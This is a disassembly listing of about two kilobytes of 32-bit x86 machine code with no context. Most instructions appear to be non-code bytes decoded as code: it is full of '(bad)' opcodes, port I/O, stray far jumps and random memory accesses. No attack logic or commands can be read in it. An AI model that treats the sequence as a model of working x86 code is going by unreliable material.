  40f5f7:	aaa    
  40f5f8:	mov    eax,0x41154154
  40f5fd:	xor    eax,0xc7733257
  40f602:	in     eax,0x8
  40f604:	lahf   
  40f605:	aad    0xcc
  40f607:	adc    al,0xc
  40f609:	xor    al,0x7c
  40f60b:	or     esi,ebp
  40f60d:	(bad)  
  40f60e:	xor    edi,ebx
  40f610:	daa    
  40f611:	ret    
  40f612:	xchg   ebp,eax
  40f613:	outs   dx,DWORD PTR ds:[esi]
  40f614:	or     ebp,DWORD PTR [ebp+0x29]
  40f617:	mov    ebx,0xf82241d5
  40f61c:	out    dx,eax
  40f61d:	push   es
  40f61e:	mov    ecx,0x28f5720e
  40f623:	fidiv  DWORD PTR [ecx]
  40f625:	lods   al,BYTE PTR ds:[esi]
  40f626:	pop    esp
  40f627:	mov    esp,0x8e095a41
  40f62c:	adc    DWORD PTR [eax-0x35],ebp
  40f62f:	xor    al,0xad
  40f631:	mov    ah,0x81
  40f633:	neg    DWORD PTR [eax+0x650edf60]
  40f639:	xchg   edx,eax
  40f63a:	pop    es
  40f63b:	xor    eax,esi
  40f63d:	fidiv  DWORD PTR [edx]
  40f63f:	adc    DWORD PTR [edx-0x13],eax
  40f642:	adc    BYTE PTR [ebp-0x697c250c],cl
  40f648:	call   0xda40:0x8c13910a
  40f64f:	add    al,0x1a
  40f651:	shr    BYTE PTR [esi+0x10f8440f],cl
  40f657:	and    al,0xc0
  40f659:	sti    
  40f65a:	xor    eax,0x6e353ef7
  40f65f:	adc    al,0x13
  40f661:	jmp    0xe667:0x449fdf50
  40f668:	cmp    DWORD PTR [ebx+0x30],edx
  40f66b:	lods   eax,DWORD PTR ds:[esi]
  40f66c:	ror    BYTE PTR [ebp+eiz*4-0x63],0xfb
  40f671:	cmp    BYTE PTR [edx+edx*8],cl
  40f674:	out    dx,al
  40f675:	mov    bh,0xa4
  40f677:	enter  0x58e1,0x3b
  40f67b:	shl    DWORD PTR [esi],cl
  40f67d:	mov    cl,0xe2
  40f67f:	xor    BYTE PTR [edi],cl
  40f681:	xor    bl,BYTE PTR [eax+eax*2-0x492794f]
  40f688:	sub    al,0x2e
  40f68a:	jne    0x40f6a0
  40f68c:	dec    ecx
  40f68d:	inc    eax
  40f68e:	xor    al,0x1b
  40f690:	jecxz  0x40f6d9
  40f692:	mov    ch,0x3a
  40f694:	jbe    0x40f640
  40f696:	cmc    
  40f697:	xor    BYTE PTR [esi],dh
  40f699:	aaa    
  40f69a:	in     eax,0x60
  40f69c:	leave  
  40f69d:	ss mov ebp,0xdfc65796
  40f6a4:	mov    esi,0xf5677041
  40f6a9:	inc    ecx
  40f6aa:	lods   eax,DWORD PTR ds:[esi]
  40f6ab:	lahf   
  40f6ac:	push   ss
  40f6ad:	mov    ds:0x5a8417c4,eax
  40f6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6b3:	es sbb bh,al
  40f6b6:	add    al,0x18
  40f6b8:	mov    ecx,esi
  40f6ba:	sub    DWORD PTR [ebx-0x2f],edi
  40f6bd:	sub    BYTE PTR [ecx],bl
  40f6bf:	das    
  40f6c0:	sub    esp,DWORD PTR [eax-0x5e7eba53]
  40f6c6:	les    eax,FWORD PTR [ebp+0x48]
  40f6c9:	popf   
  40f6ca:	cmc    
  40f6cb:	fdiv   QWORD PTR [esi]
  40f6cd:	jmp    0xfb5733fd
  40f6d2:	icebp  
  40f6d3:	push   esi
  40f6d4:	push   ds
  40f6d5:	sahf   
  40f6d6:	push   ds
  40f6d7:	scas   eax,DWORD PTR es:[edi]
  40f6d8:	test   dl,dl
  40f6da:	sbb    bl,ch
  40f6dc:	mov    ecx,DWORD PTR [edx+0x22]
  40f6df:	or     al,0x8
  40f6e1:	sub    cl,bl
  40f6e3:	jns    0x40f6a2
  40f6e5:	test   al,0x54
  40f6e7:	xlat   BYTE PTR ds:[ebx]
  40f6e8:	sahf   
  40f6e9:	sub    BYTE PTR [bp+0x4],ah
  40f6ed:	lock adc eax,0x75247925
  40f6f3:	or     BYTE PTR [ebp-0x11e78cd7],ah
  40f6f9:	sub    DWORD PTR [ecx+0x54b13b68],ebx
  40f6ff:	dec    ecx
  40f700:	mov    ebx,ds
  40f702:	int    0xdc
  40f704:	xor    eax,0xdf46c6a6
  40f709:	sub    eax,DWORD PTR [ebx]
  40f70b:	loopne 0x40f6eb
  40f70d:	in     eax,dx
  40f70e:	inc    ebx
  40f70f:	add    DWORD PTR [edi+ecx*2],ecx
  40f712:	gs jp  0x40f742
  40f715:	scas   ax,WORD PTR es:[edi]
  40f717:	clc    
  40f718:	out    dx,eax
  40f719:	or     dh,al
  40f71b:	rcr    DWORD PTR [ecx-0x4fe06d0a],0x99
  40f722:	push   esi
  40f723:	aam    0xba
  40f725:	cmp    eax,0x2b5012de
  40f72a:	aad    0xc6
  40f72c:	cmp    DWORD PTR [ebp+ecx*4+0x57],0x4888c544
  40f734:	cwde   
  40f735:	retf   0x4a0
  40f738:	add    ch,BYTE PTR [eax+eax*2-0x13c2b469]
  40f73f:	fs inc esi
  40f741:	inc    ecx
  40f742:	mov    BYTE PTR [edi],bh
  40f744:	push   0xfd4bad51
  40f749:	cs inc esi
  40f74b:	add    BYTE PTR [esi+0x357a7afb],ah
  40f751:	sbb    esp,DWORD PTR [ebx+0x16b7f138]
  40f757:	je     0x40f76c
  40f759:	lods   eax,DWORD PTR fs:[esi]
  40f75b:	scas   al,BYTE PTR es:[edi]
  40f75c:	xor    DWORD PTR [edi],edi
  40f75e:	xor    DWORD PTR [ebx],ecx
  40f760:	inc    esp
  40f761:	std    
  40f762:	xor    ebp,DWORD PTR [ebp+0x16]
  40f765:	ds mov ebx,0x329140f4
  40f76b:	pop    ds
  40f76c:	hlt    
  40f76d:	xor    ecx,DWORD PTR [edi-0x3]
  40f770:	aad    0x70
  40f772:	inc    esp
  40f773:	arpl   WORD PTR [ebx-0x7c],sp
  40f776:	add    ebp,DWORD PTR ds:0x81661f6b
  40f77c:	(bad)  
  40f77d:	jmp    0x40f745
  40f77f:	mov    ?,WORD PTR [ebx+0x16]
  40f782:	pop    ecx
  40f783:	push   0xffffffad
  40f785:	inc    esp
  40f786:	mov    cl,0xa4
  40f788:	sahf   
  40f789:	mov    ebp,0xc256b318
  40f78e:	in     eax,dx
  40f78f:	cmc    
  40f790:	adc    edi,DWORD PTR [ecx+eiz*8]
  40f793:	dec    edi
  40f794:	xor    al,0xa1
  40f796:	push   ds
  40f797:	in     eax,0x23
  40f799:	sahf   
  40f79a:	in     al,0x13
  40f79c:	pop    ss
  40f79d:	mov    edi,0x1ab0d170
  40f7a2:	mov    ebp,ds
  40f7a4:	div    ecx
  40f7a6:	fs mov dl,0xae
  40f7a9:	ins    BYTE PTR es:[edi],dx
  40f7aa:	out    0x57,eax
  40f7ac:	push   esi
  40f7ad:	pop    edi
  40f7ae:	or     DWORD PTR [ebp+0x38],eax
  40f7b1:	mov    ds:0x52c9d5fa,al
  40f7b6:	adc    bh,BYTE PTR ds:0x4b4e913d
  40f7bc:	jmp    0x40f801
  40f7be:	cld    
  40f7bf:	mov    cl,0xaf
  40f7c1:	jno    0x40f806
  40f7c3:	or     DWORD PTR [ebp-0x5b50a52f],0xa1cda374
  40f7cd:	cld    
  40f7ce:	fs pop ds
  40f7d0:	mov    bh,0x5f
  40f7d2:	test   al,0xdf
  40f7d4:	lahf   
  40f7d5:	inc    ebp
  40f7d6:	sbb    dh,BYTE PTR [ecx+0x77]
  40f7d9:	icebp  
  40f7da:	pop    edi
  40f7db:	ss popf 
  40f7dd:	(bad)  [ebp+edi*2+0x4bc3447]
  40f7e4:	sub    eax,0xf911a116
  40f7e9:	inc    ebp
  40f7ea:	or     eax,0xa214af5d
  40f7ef:	and    DWORD PTR [edi],ebp
  40f7f1:	cld    
  40f7f2:	call   0xecaa:0x9b549d5a
  40f7f9:	ja     0x40f78f
  40f7fb:	enter  0x298e,0x9d
  40f7ff:	push   ebx
  40f800:	inc    ecx
  40f801:	xor    al,0x63
  40f803:	mov    ebp,0x413f07f8
  40f808:	rcl    DWORD PTR [edx-0x63],0xb1
  40f80c:	jno    0x40f80c
  40f80e:	lds    ecx,FWORD PTR [ebp-0x66ebfe6f]
  40f814:	mov    ebp,0x1f6898cf
  40f819:	into   
  40f81a:	shl    DWORD PTR [edi-0x47],0x38
  40f81e:	inc    esp
  40f81f:	cdq    
  40f820:	in     al,0xd9
  40f822:	out    0xb4,eax
  40f824:	inc    ebp
  40f825:	popa   
  40f826:	mov    bl,0x69
  40f828:	fst    QWORD PTR [ebx+edi*8+0x3e9c70e6]
  40f82f:	xchg   esi,eax
  40f830:	(bad)  
  40f832:	xchg   ebp,eax
  40f833:	jo     0x40f7f0
  40f835:	sti    
  40f836:	mov    bl,0xc4
  40f838:	jae    0x40f89a
  40f83a:	enter  0xcf35,0xbc
  40f83e:	xlat   BYTE PTR ds:[ebx]
  40f83f:	xor    DWORD PTR ds:0x45bb5325,0x4f
  40f846:	pop    ecx
  40f847:	loopne 0x40f7ee
  40f849:	mov    bh,0xc4
  40f84b:	mov    ch,0x7e
  40f84d:	xor    bh,BYTE PTR [eax+0x5dcc9587]
  40f853:	(bad)  
  40f854:	mov    eax,0x3203aa24
  40f859:	dec    esp
  40f85a:	xchg   edi,eax
  40f85b:	fbld   TBYTE PTR [edx]
  40f85d:	mov    cl,0x94
  40f85f:	push   0x5715bac9
  40f864:	xchg   ebp,eax
  40f865:	push   edi
  40f866:	shl    DWORD PTR [ebp-0x3df4506d],1
  40f86c:	push   es
  40f86d:	add    DWORD PTR [edi],ebx
  40f86f:	cwde   
  40f870:	and    DWORD PTR [edx+edi*8],0x8270b244
  40f877:	not    BYTE PTR [ebp-0x2a]
  40f87a:	and    dh,BYTE PTR fs:[edi+0x720f9cf6]
  40f881:	sub    al,ah
  40f883:	(bad)  
  40f884:	shr    BYTE PTR [ebx-0x80],1
  40f887:	mov    BYTE PTR [edx],bl
  40f889:	or     esp,edi
  40f88b:	push   ds
  40f88c:	mov    fs,WORD PTR [ecx+0x44]
  40f88f:	ror    DWORD PTR [ebx-0x64],0xd3
  40f893:	inc    esp
  40f894:	ret    
  40f895:	adc    eax,0x521dd15a
  40f89a:	pusha  
  40f89b:	test   ecx,ebp
  40f89d:	mov    ebx,0xbc698e
  40f8a2:	add    eax,0xbea30618
  40f8a7:	inc    edx
  40f8a8:	mov    esp,0x82c6b52c
  40f8ad:	mov    ecx,0x9f0afda9
  40f8b2:	xor    dh,0xb0
  40f8b5:	sahf   
  40f8b6:	mov    cl,0xe6
  40f8b8:	retf   
  40f8b9:	and    DWORD PTR ds:0x373abf09,esp
  40f8bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c0:	xchg   ebx,eax
  40f8c1:	adc    ebp,DWORD PTR [eax]
  40f8c3:	adc    eax,0x23a1e336
  40f8c8:	fdivr  DWORD PTR [ebp-0x373c4506]
  40f8ce:	jl     0x40f91a
  40f8d0:	mov    DWORD PTR [ebp+0x68fb5b9b],edx
  40f8d6:	js     0x40f949
  40f8d8:	add    eax,0x822380b4
  40f8dd:	jmp    0x5ae82270
  40f8e2:	popa   
  40f8e3:	repnz sahf 
  40f8e5:	jno    0x40f87f
  40f8e7:	cmp    ebp,DWORD PTR [edi+0x66]
  40f8ea:	xchg   BYTE PTR [eax+0x24b718e4],dh
  40f8f0:	aam    0x28
  40f8f2:	inc    ecx
  40f8f3:	pop    ds
  40f8f4:	inc    edi
  40f8f5:	sahf   
  40f8f6:	push   ebx
  40f8f7:	cdq    
  40f8f8:	or     al,0x38
  40f8fa:	fldenv [ebx+0x78]
  40f8fd:	out    0xd7,eax
  40f8ff:	es out dx,eax
  40f901:	sbb    esp,DWORD PTR [ebp-0x62]
  40f904:	into   
  40f905:	fcomp  DWORD PTR [esi-0x6d6eca7e]
  40f90b:	xor    BYTE PTR [eax+0x6],al
  40f90e:	push   ebx
  40f90f:	call   DWORD PTR [esi+0x223123a0]
  40f915:	pop    ds
  40f916:	scas   al,BYTE PTR es:[edi]
  40f917:	dec    ebx
  40f918:	or     dl,0xa2
  40f91b:	sbb    bl,ch
  40f91d:	cli    
  40f91e:	out    dx,eax
  40f91f:	mov    dl,0x2c
  40f921:	test   eax,0x984d240f
  40f926:	addr16 jae 0x40f900
  40f929:	cmp    al,0xc3
  40f92b:	fnstsw WORD PTR [eax-0x7c35b9da]
  40f931:	xchg   esi,eax
  40f932:	cmp    al,0x17
  40f934:	push   ebp
  40f935:	cli    
  40f936:	and    eax,DWORD PTR [edx+eax*2-0x1e]
  40f93a:	push   edi
  40f93b:	bound  ebx,QWORD PTR [ebp+0x29]
  40f93e:	sbb    BYTE PTR [ebp+edx*4-0x3d],ah
  40f942:	mov    ds,WORD PTR [ebp-0x37]
  40f945:	mov    dh,0xcc
  40f947:	scas   eax,DWORD PTR es:[edi]
  40f948:	push   0x9de9f792
  40f94d:	sahf   
  40f94e:	adc    al,0x54
  40f950:	push   ds
  40f951:	fs cwde 
  40f953:	test   eax,0xeb4217f5
  40f958:	(bad)  
  40f959:	jmp    0x40f909
  40f95b:	in     eax,dx
  40f95c:	mov    ebx,0x913695b1
  40f961:	nop
  40f962:	dec    dh
  40f964:	aas    
  40f965:	(bad)  
  40f966:	out    dx,eax
  40f967:	mov    bh,0x9a
  40f969:	fisttp DWORD PTR [ebx]
  40f96b:	sub    BYTE PTR [edi],ah
  40f96d:	jmp    0x1f70:0x349b76ea
  40f974:	addr16 xor al,0xb
  40f977:	push   edi
  40f978:	out    0x48,al
  40f97a:	call   0x9f20:0xfc1d43c4
  40f981:	clc    
  40f982:	daa    
  40f983:	xchg   ebx,eax
  40f984:	fidivr DWORD PTR [ebp-0x38]
  40f987:	mov    ebx,0x79f07c0d
  40f98c:	test   DWORD PTR [edi-0x7c4d7ba],esi
  40f992:	jecxz  0x40f92a
  40f994:	adc    bl,BYTE PTR [edi]
  40f996:	adc    eax,0xddd24638
  40f99b:	sbb    ah,dl
  40f99d:	(bad)  
  40f99e:	mov    bh,BYTE PTR [ebx]
  40f9a0:	outs   dx,BYTE PTR ds:[esi]
  40f9a1:	pop    ds
  40f9a2:	pop    ebx
  40f9a3:	mov    esi,0x21ba162e
  40f9a8:	ror    DWORD PTR [edx-0x77],1
  40f9ab:	jbe    0x40f9ce
  40f9ad:	sub    eax,0x7c36ddc7
  40f9b2:	nop
  40f9b3:	pushf  
  40f9b4:	in     eax,0x6b
  40f9b6:	xor    BYTE PTR [ebx-0x2],ah
  40f9b9:	cmc    
  40f9ba:	cmc    
  40f9bb:	pop    edx
  40f9bc:	imul   ecx,DWORD PTR [edx],0xffffffb7
  40f9bf:	das    
  40f9c0:	rcl    ecx,0x8
  40f9c3:	pop    edx
  40f9c4:	neg    DWORD PTR [edi+0x4232ef4a]
  40f9ca:	in     al,0x91
  40f9cc:	arpl   WORD PTR [edi],bp
  40f9ce:	inc    ecx
  40f9cf:	dec    ecx
  40f9d0:	(bad)  
  40f9d1:	imul   DWORD PTR [esi]
  40f9d3:	pop    esp
  40f9d4:	setle  BYTE PTR [edx-0x40]
  40f9d8:	loop   0x40f9df
  40f9da:	push   edx
  40f9db:	or     al,0xea
  40f9dd:	scas   al,BYTE PTR es:[edi]
  40f9de:	xchg   esp,ecx
  40f9e0:	iret   
  40f9e1:	ficom  DWORD PTR [edi+0xea02e5d]
  40f9e7:	mov    cl,0xb2
  40f9e9:	xor    al,0x24
  40f9eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ec:	dec    eax
  40f9ed:	stos   BYTE PTR es:[edi],al
  40f9ee:	add    al,0xf
  40f9f0:	xchg   ebp,eax
  40f9f1:	push   edx
  40f9f2:	out    0xb7,eax
  40f9f4:	mov    bl,0x68
  40f9f6:	xchg   DWORD PTR [esp+ebp*2-0x654b6b1b],edx
  40f9fd:	std    
  40f9fe:	lods   eax,DWORD PTR ds:[esi]
  40f9ff:	fisttp DWORD PTR [esi]
  40fa01:	cmp    al,0xbc
  40fa03:	jo     0x40f9c0
  40fa05:	mov    esp,0x5ab95d9b
  40fa0a:	push   edx
  40fa0b:	mov    al,0x15
  40fa0d:	aad    0x68
  40fa0f:	jns    0x40fa1c
  40fa11:	nop
  40fa12:	mov    edx,0xd4f6e314
  40fa17:	xchg   edi,eax
  40fa19:	jbe    0x40f9b6
  40fa1b:	or     dl,ch
  40fa1d:	cli    
  40fa1e:	add    BYTE PTR [ecx],bl
  40fa20:	or     BYTE PTR ds:0xc86a956c,dl
  40fa26:	sbb    cl,BYTE PTR ds:0x9a7fddfd
  40fa2c:	call   0x33eb1835
  40fa31:	dec    ecx
  40fa32:	mov    al,0x96
  40fa34:	mov    dh,0xae
  40fa36:	pcmpgtb mm7,mm4
  40fa39:	jmp    0xa709aa05
  40fa3e:	jb     0x40f9d2
  40fa40:	sbb    BYTE PTR [bp-0x1d],ah
  40fa44:	inc    eax
  40fa45:	rcl    BYTE PTR [ecx],0x1c
  40fa48:	dec    esi
  40fa49:	outs   dx,BYTE PTR ds:[esi]
  40fa4a:	or     esi,DWORD PTR [ebx-0x28]
  40fa4d:	cmc    
  40fa4e:	push   ebx
  40fa4f:	pop    ecx
  40fa50:	div    BYTE PTR ds:0x4cd35779
  40fa56:	or     DWORD PTR [edx+0x9],edx
  40fa59:	xor    DWORD PTR [edi+0x2dd92278],esi
  40fa5f:	mov    ?,WORD PTR [edx+esi*1-0x1777c51f]
  40fa66:	bound  ecx,QWORD PTR [ebp+0x186ffd00]
  40fa6c:	popf   
  40fa6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6e:	or     BYTE PTR [esi-0x7a679b85],0x95
  40fa75:	ret    
  40fa76:	loop   0x40f9fb
  40fa78:	sub    eax,0x13b3883f
  40fa7d:	and    eax,0x3bbc940
  40fa82:	xchg   edx,eax
  40fa83:	stos   DWORD PTR es:[edi],eax
  40fa84:	les    ecx,FWORD PTR [edi+0x64]
  40fa87:	adc    eax,DWORD PTR [ebp-0x79]
  40fa8a:	xchg   ebp,eax
  40fa8b:	inc    esp
  40fa8c:	popf   
  40fa8d:	cmp    ch,0xef
  40fa90:	dec    ebp
  40fa91:	xchg   esp,eax
  40fa92:	jmp    0xeb43:0xbf2db123
  40fa99:	pop    ebx
  40fa9a:	and    eax,0x9bad71d3
  40fa9f:	or     BYTE PTR [ebx],dl
  40faa1:	adc    DWORD PTR [edi],ecx
  40faa3:	pop    es
  40faa4:	aam    0x8f
  40faa6:	aaa    
  40faa7:	ret    0x8d4f
  40faaa:	(bad)  
  40faab:	gs pop ds
  40faad:	xchg   esi,eax
  40faae:	pop    ebp
  40faaf:	pop    esi
  40fab0:	add    al,0xc2
  40fab2:	ficomp DWORD PTR [edx]
  40fab4:	jne    0x40facc
  40fab6:	dec    eax
  40fab7:	xchg   dl,ah
  40fab9:	scas   al,BYTE PTR es:[edi]
  40faba:	mov    bh,0x8b
  40fabc:	repnz das 
  40fabe:	imul   ebp,DWORD PTR [ebx+0x35],0xe
  40fac2:	push   0xffffff8b
  40fac4:	dec    edx
  40fac5:	and    eax,0x1c2a69
  40faca:	je     0x40fac3
  40facc:	imul   ecx,DWORD PTR [esi+0x224f63d4],0x5cad9ee8
  40fad6:	out    0xb8,eax
  40fad8:	and    eax,0x6d43f4d1
  40fadd:	add    ecx,eax
  40fadf:	xchg   BYTE PTR [eax+0x7ec5796d],ah
  40fae5:	push   ss
  40fae6:	add    BYTE PTR [esi],bh
  40fae8:	mov    BYTE PTR [ebp-0xe],ch
  40faeb:	or     BYTE PTR [edx+0x7e],cl
  40faee:	fs dec eax
  40faf0:	dec    esp
  40faf1:	xor    al,0x5c
  40faf3:	icebp  
  40faf4:	or     al,0x20
  40faf6:	fs mov cl,0x9d
  40faf9:	pop    edx
  40fafa:	iret   
  40fafb:	arpl   cx,ax
  40fafd:	or     BYTE PTR [eax],dh
  40faff:	mov    esi,0x8debea1f
  40fb04:	dec    edx
  40fb05:	sbb    DWORD PTR [ebp-0x3060b740],0xffffffcb
  40fb0c:	outs   dx,BYTE PTR ds:[esi]
  40fb0d:	mov    ah,0xa0
  40fb0f:	push   0x36ff56f6
  40fb14:	jl     0x40fafd
  40fb16:	repnz mov bh,0x80
  40fb19:	enter  0x39a6,0xf3
  40fb1d:	mov    ss,WORD PTR [edi+esi*4]
  40fb20:	mov    WORD PTR [esi+0x61],ds
  40fb23:	inc    edx
  40fb24:	fimul  WORD PTR [edx-0x43216ac9]
  40fb2a:	jg     0x40fac7
  40fb2c:	pop    esp
  40fb2d:	popf   
  40fb2e:	add    bh,ch
  40fb30:	mov    dh,0xad
  40fb32:	aad    0xa7
  40fb34:	sbb    bl,BYTE PTR ds:[edx-0x2b]
  40fb38:	adc    BYTE PTR [edx-0x57097058],bh
  40fb3e:	gs inc ebx
  40fb40:	fcomip st,st(5)
  40fb42:	sahf   
  40fb43:	test   eax,0xdbb114d9
  40fb48:	sub    al,bh
  40fb4a:	or     edi,ebp
  40fb4c:	mov    bh,0xe2
  40fb4e:	pop    eax
  40fb4f:	enter  0x92ba,0x46
  40fb53:	xchg   ecx,eax
  40fb54:	in     al,dx
  40fb55:	or     BYTE PTR [ecx+0x2904844e],bl
  40fb5b:	mov    dl,BYTE PTR [ecx+esi*4-0x2e272f23]
  40fb62:	fimul  WORD PTR [edx+0x4b1d3fa0]
  40fb68:	jbe    0x40fbae
  40fb6a:	pop    edi
  40fb6b:	test   eax,0x8c5bcaec
  40fb70:	aas    
  40fb71:	(bad)  
  40fb72:	sbb    eax,0xaf1d9375
  40fb77:	clc    
  40fb78:	add    eax,DWORD PTR [edi-0x25]
  40fb7b:	jge    0x40fb9d
  40fb7d:	(bad)
  40fb82:	fisttp WORD PTR [esi-0x51]
  40fb85:	cld    
  40fb86:	and    eax,0x4fca8ad1
  40fb8b:	xor    al,0xf5
  40fb8d:	jge    0x40fbeb
  40fb8f:	retf   0x6c10
  40fb92:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb94:	push   eax
  40fb95:	add    eax,0x85127f20
  40fb9a:	mov    bl,0x3b
  40fb9c:	ss fwait
  40fb9e:	add    al,0x67
  40fba0:	sub    eax,DWORD PTR [eax]
  40fba2:	fdiv   QWORD PTR [esi+0x22]
  40fba5:	out    0xf6,al
  40fba7:	cmp    BYTE PTR [edx+eax*8-0xd1ec4a3],0x1e
  40fbaf:	mov    al,0xe1
  40fbb1:	mov    ecx,0xcae9b7a
  40fbb6:	mov    BYTE PTR [ebx-0x6db3dcd6],cl
  40fbbc:	dec    esp
  40fbbd:	xchg   esp,eax
  40fbbe:	jns    0x40fbc2
  40fbc0:	mov    cl,BYTE PTR [ebx-0x57]
  40fbc3:	bound  edx,QWORD PTR [ebp-0x63d1e7b7]
  40fbc9:	mov    esi,0x32eb8c17
  40fbce:	fistp  QWORD PTR [eax+0xc]
  40fbd1:	adc    al,0xcf
  40fbd3:	mov    es,WORD PTR [eax+edx*8+0x0]
  40fbd7:	ficom  WORD PTR [eax-0x26b5d6bc]
  40fbdd:	(bad)  
  40fbde:	push   ds
  40fbdf:	dec    edx
  40fbe0:	sbb    BYTE PTR [esi],0x6
  40fbe3:	outs   dx,DWORD PTR ds:[esi]
  40fbe4:	cmp    dl,ch
  40fbe6:	(bad)  
  40fbe8:	inc    esi
  40fbe9:	xchg   DWORD PTR [ebp-0x3b13f204],edx
  40fbef:	jb     0x40fbe1
  40fbf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbf2:	lods   eax,DWORD PTR ds:[esi]
  40fbf3:	add    cl,BYTE PTR [edi-0x3d]
  40fbf6:	xchg   esp,eax
  40fbf7:	xor    BYTE PTR [edx],dh
  40fbf9:	sti    
  40fbfa:	jbe    0x40fc36
  40fbfc:	or     ebx,ebp
  40fbfe:	push   0x16
  40fc00:	sub    esp,esi
  40fc02:	addr16 mov al,ds:0x4b72
  40fc06:	mov    ss,WORD PTR [eax]
  40fc08:	pop    edi
  40fc09:	mov    dl,0x83
  40fc0b:	push   es
  40fc0c:	xchg   ebp,eax
  40fc0d:	pop    ecx
  40fc0e:	gs or  eax,0xe8fc9010
  40fc14:	rol    BYTE PTR gs:[ecx-0x4461f8c3],1
  40fc1b:	cld    
  40fc1c:	mov    WORD PTR [ebx-0x70],es
  40fc1f:	or     al,0x78
  40fc21:	xchg   ecx,eax
  40fc22:	inc    ebx
  40fc23:	sub    eax,0xf2f0769a
  40fc28:	push   0x42
  40fc2a:	not    DWORD PTR [ebx+ebx*2]
  40fc2d:	retf   0x62ef
  40fc30:	add    eax,0x162ab06f
  40fc35:	shr    DWORD PTR [esi-0x10],cl
  40fc38:	popa   
  40fc39:	xchg   edi,eax
  40fc3a:	(bad)  
  40fc3b:	clc    
  40fc3c:	dec    ebp
  40fc3d:	sbb    cl,dl
  40fc3f:	sub    dl,BYTE PTR [ebp-0x584fa385]
  40fc45:	jl     0x40fc16
  40fc47:	inc    edx
  40fc48:	rcl    ch,1
  40fc4a:	add    ebp,DWORD PTR [edi]
  40fc4c:	popf   
  40fc4d:	jne    0x40fc88
  40fc4f:	sub    ebx,DWORD PTR [edx-0x7b2d8eb0]
  40fc55:	adc    edx,DWORD PTR [edi+eiz*2]
  40fc58:	push   cs
  40fc59:	mov    ecx,0x2563cc21
  40fc5e:	pop    ss
  40fc5f:	pop    edi
  40fc60:	setbe  cl
  40fc63:	pop    edi
  40fc64:	retf   0x3f67
  40fc67:	inc    ebp
  40fc68:	test   BYTE PTR [eax+ecx*8],al
  40fc6b:	ror    DWORD PTR [edx+0x3b8d1d8c],1
  40fc71:	int    0xd7
  40fc73:	push   es
  40fc74:	cmp    eax,0xbdeaf597
  40fc79:	lahf   
  40fc7a:	mov    ecx,0x1a6766ec
  40fc7f:	sub    BYTE PTR [edx],al
  40fc81:	inc    edx
  40fc82:	and    dh,BYTE PTR [edx+0x922a6d5]
  40fc88:	pop    ss
  40fc89:	pop    ss
  40fc8a:	test   DWORD PTR [edi-0x38],0x62b790fe
  40fc91:	ss fcmovbe st,st(6)
  40fc94:	dec    esp
  40fc95:	outs   dx,BYTE PTR ds:[esi]
  40fc96:	fadd   st(3),st
  40fc98:	iret   
  40fc99:	leave  
  40fc9a:	aas    
  40fc9b:	jecxz  0x40fce1
  40fc9d:	xchg   BYTE PTR [edx],bh
  40fc9f:	push   es
  40fca0:	pop    ss
  40fca1:	inc    edx
  40fca2:	nop
  40fca3:	jl     0x40fc57
  40fca5:	or     cl,cl
  40fca7:	mov    cl,0xec
  40fca9:	call   0x1da7:0x10c2d4ec
  40fcb0:	outs   dx,DWORD PTR ds:[esi]
  40fcb1:	push   0x32
  40fcb3:	loop   0x40fc7a
  40fcb5:	or     al,0xb6
  40fcb7:	inc    ebx
  40fcb8:	push   0x37
  40fcba:	push   eax
  40fcbb:	test   edi,0x68022d60
  40fcc1:	jnp    0x40fd10
  40fcc3:	ja     0x40fc6a
  40fcc5:	loop   0x40fd3d
  40fcc7:	aaa    
  40fcc8:	stos   DWORD PTR es:[edi],eax
  40fcc9:	loop   0x40fc8c
  40fccb:	bnd call DWORD PTR [ecx+ebx*4-0x49ea9c96]
  40fcd3:	cmp    DWORD PTR [bx],esi
  40fcd6:	push   ebx
  40fcd7:	retf   0x2e3b
  40fcda:	add    BYTE PTR [esp+eiz*2],bh
  40fcdd:	fwait
  40fcde:	movaps xmm3,XMMWORD PTR [edi-0x37]
  40fce2:	mov    ebp,DWORD PTR [esp+edi*1-0x459c97cc]
  40fce9:	gs xchg ebp,eax
  40fceb:	inc    eax
  40fcec:	imul   BYTE PTR [ecx]
  40fcee:	mov    ?,WORD PTR [ebx+0x7752cc9d]
  40fcf4:	setno  BYTE PTR [ebp+0x3b]
  40fcf8:	out    0xbe,al
  40fcfa:	leave  
  40fcfb:	cs in  eax,dx
  40fcfd:	es jns 0x40fd3d
  40fd00:	test   ah,bh
  40fd02:	out    dx,eax
  40fd03:	shl    BYTE PTR [edx],cl
  40fd05:	sub    DWORD PTR [ecx+edx*4],0x47
  40fd09:	repz adc DWORD PTR [bp+di],ebp
  40fd0d:	cwde   
  40fd0e:	shr    BYTE PTR [ebp-0x74c43cb5],cl
  40fd14:	mov    dh,bl
  40fd16:	mov    ecx,0x5c8a55dd
  40fd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd1c:	div    BYTE PTR es:[edi-0x11]
  40fd20:	das    
  40fd21:	xlat   BYTE PTR ds:[ebx]
  40fd22:	pusha  
  40fd23:	cli    
  40fd24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd25:	cmp    dl,BYTE PTR [esp+ebx*4]
  40fd28:	and    dl,BYTE PTR [ebx+0x64a3456c]
  40fd2e:	jbe    0x40fcea
  40fd30:	and    al,0x6b
  40fd32:	push   eax
  40fd33:	call   0x40e17ec8
  40fd38:	mov    dh,0xf4
  40fd3a:	(bad)  
  40fd3b:	popf   
  40fd3c:	sbb    cl,ah
  40fd3e:	fbstp  TBYTE PTR [esi+0x1d09a7d5]
  40fd44:	mov    dl,0x20
  40fd46:	fild   DWORD PTR [eax+0x63]
  40fd49:	jb     0x40fccc
  40fd4b:	and    BYTE PTR [ecx],cl
  40fd4d:	or     cl,cl
  40fd4f:	pop    edx
  40fd50:	clc    
  40fd51:	inc    edx
  40fd52:	xor    al,0x1a
  40fd54:	loop   0x40fd13
  40fd56:	dec    edx
  40fd57:	mov    ecx,0xa2a838db
  40fd5c:	test   eax,0x19d335c9
  40fd61:	(bad)  
  40fd62:	jge    0x40fdb1
  40fd64:	adc    eax,0xdf4a4efa
  40fd69:	ds inc edi
  40fd6b:	cmp    eax,0x6d390ecd
  40fd70:	sahf   
